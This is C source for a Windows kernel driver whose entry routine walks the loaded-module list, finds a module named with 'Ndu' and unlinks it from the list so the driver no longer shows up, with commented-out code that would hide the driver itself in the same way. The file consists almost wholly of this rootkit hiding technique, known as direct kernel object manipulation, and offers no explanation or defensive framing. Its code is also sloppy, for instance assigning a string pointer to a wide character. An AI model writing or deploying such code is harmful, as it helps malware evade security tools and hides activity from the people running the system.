#include <ntddk.h>

typedef struct _LDR_DATA_TABLE_ENTRY
{
	LIST_ENTRY InLoadOrderLinks;
	LIST_ENTRY InMemoryOrderLinks;
	LIST_ENTRY InInitializationOrderLinks;
	PVOID DllBase;
	PVOID EntryPoint;
	ULONG SizeOfImage;
	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;
	ULONG Flags;
	USHORT LoadCount;
	USHORT TlsIndex;
	union
	{
		LIST_ENTRY HashLinks;
		struct
		{
			PVOID SectionPointer;
			ULONG CheckSum;
		};
	};
	union
	{
		ULONG TimeDateStamp;
		PVOID LoadedImports;
	};
	struct _ACTIVATION_CONTEXT * EntryPointActivationContext;
	PVOID PatchInformation;
	LIST_ENTRY ForwarderLinks;
	LIST_ENTRY ServiceTagLinks;
	LIST_ENTRY StaticLinks;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

char *stristr(const char *String, const char *Pattern)
{
	char *pptr, *sptr, *start;

	for (start = (char *)String; *start != NULL; start++)
	{
		/* find start of pattern in string */
		for (; ((*start != NULL) && (toupper(*start)
			!= toupper(*Pattern))); start++)
			;
		if (NULL == *start)
			return NULL;

		pptr = (char *)Pattern;
		sptr = (char *)start;

		while (toupper(*sptr) == toupper(*pptr))
		{
			sptr++;
			pptr++;

			/* if end of pattern then pattern was found */

			if (NULL == *pptr)
				return (start);
		}
	}
	return NULL;
}

NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath)
{
	PLDR_DATA_TABLE_ENTRY PrevEntry, ModuleEntry, NextEntry, pprev, nnext, ndu, nPrevEntry, nNextEntry;

	DbgPrint("DriverSection address: %#x", pDriverObject->DriverSection);
	DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "hello %#x", pDriverObject->DriverSection);
	ModuleEntry = (PLDR_DATA_TABLE_ENTRY)pDriverObject->DriverSection;

	PrevEntry = (PLDR_DATA_TABLE_ENTRY)ModuleEntry->InLoadOrderLinks.Blink;
	NextEntry = (PLDR_DATA_TABLE_ENTRY)ModuleEntry->InLoadOrderLinks.Flink;
		
	pprev = PrevEntry;
	WCHAR Name[250] = { 0 };
	while (pprev != NULL && pprev != NextEntry)
	{
		DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "hello33 %wZ", pprev->FullDllName);
		pprev = (PLDR_DATA_TABLE_ENTRY)pprev->InLoadOrderLinks.Blink;
		//DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "hello3 %#x", pprev->DllBase);

		RtlCopyMemory(Name, pprev->FullDllName.Buffer, min(pprev->FullDllName.Length, 249));


		//DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "hello333 %ws", Name);
		//DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "hello3QQ %ws", pprev->FullDllName.Buffer);
		wchar_t xx = wcsstr(Name, L"Ndu");
		////DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "hello333 %wc", xx);
		if (xx != NULL)
		{	

			ndu = pprev; 

			nPrevEntry = (PLDR_DATA_TABLE_ENTRY)ndu->InLoadOrderLinks.Blink;
			nNextEntry = (PLDR_DATA_TABLE_ENTRY)ndu->InLoadOrderLinks.Flink;

			nPrevEntry->InLoadOrderLinks.Flink = ndu->InLoadOrderLinks.Flink;
			nNextEntry->InLoadOrderLinks.Blink = ndu->InLoadOrderLinks.Blink;

			ndu->InLoadOrderLinks.Flink = (PLIST_ENTRY)ndu;
			ndu->InLoadOrderLinks.Blink = (PLIST_ENTRY)ndu;

			DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "hello33 %wZ", ndu->FullDllName);
			DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "Hidden driver loaded at address %#x", ndu->FullDllName);
			break;
		}
	}

	//DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "HERE");

	//nnext = NextEntry;
	//while (nnext != NULL && nnext != PrevEntry)
	//{
	//	DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "hello44 %wZ", nnext->FullDllName);
	//	nnext = (PLDR_DATA_TABLE_ENTRY)nnext->InLoadOrderLinks.Flink;
	//	//DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "hello3 %#x", pprev->DllBase);

	//	RtlCopyMemory(Name, nnext->FullDllName.Buffer, min(nnext->FullDllName.Length, 249));


	//	//DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "hello333 %ws", Name);
	//	//DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "hello3QQ %ws", pprev->FullDllName.Buffer);
	//	wchar_t xx = wcsstr(Name, L"Ndu");
	//	//DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "hello333 %wc", xx);
	//	if (xx != NULL)
	//	{

	//		ndu = nnext;

	//		/*nPrevEntry = (PLDR_DATA_TABLE_ENTRY)ndu->InLoadOrderLinks.Blink;
	//		nNextEntry = (PLDR_DATA_TABLE_ENTRY)ndu->InLoadOrderLinks.Flink;

	//		nPrevEntry->InLoadOrderLinks.Flink = ndu->InLoadOrderLinks.Flink;
	//		nNextEntry->InLoadOrderLinks.Blink = ndu->InLoadOrderLinks.Blink;

	//		ndu->InLoadOrderLinks.Flink = (PLIST_ENTRY)ndu;
	//		ndu->InLoadOrderLinks.Blink = (PLIST_ENTRY)ndu;*/

	//		DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "hello33 %wZ", ndu->FullDllName);
	//		DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "Hidden driver loaded at address %#x", ndu->FullDllName);
	//		break;
	//	}
	//}

	///*

	//DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "hello4 %#x", NextEntry->DllBase);

	//nnext = NextEntry;
	//while (nnext != NULL && nnext != PrevEntry)
	//{
	//	nnext = (PLDR_DATA_TABLE_ENTRY)nnext->InLoadOrderLinks.Blink;
	//	DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "hello5 %#x", nnext->DllBase);
	//	DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "hello55 %wZ", pprev->FullDllName);
	//}*/

	//PrevEntry->InLoadOrderLinks.Flink = ModuleEntry->InLoadOrderLinks.Flink;
	//NextEntry->InLoadOrderLinks.Blink = ModuleEntry->InLoadOrderLinks.Blink;

	//ModuleEntry->InLoadOrderLinks.Flink = (PLIST_ENTRY)ModuleEntry;
	//ModuleEntry->InLoadOrderLinks.Blink = (PLIST_ENTRY)ModuleEntry;

	DbgPrint("Hidden driver loaded at address %#x", ModuleEntry->DllBase);
	return STATUS_SUCCESS;
}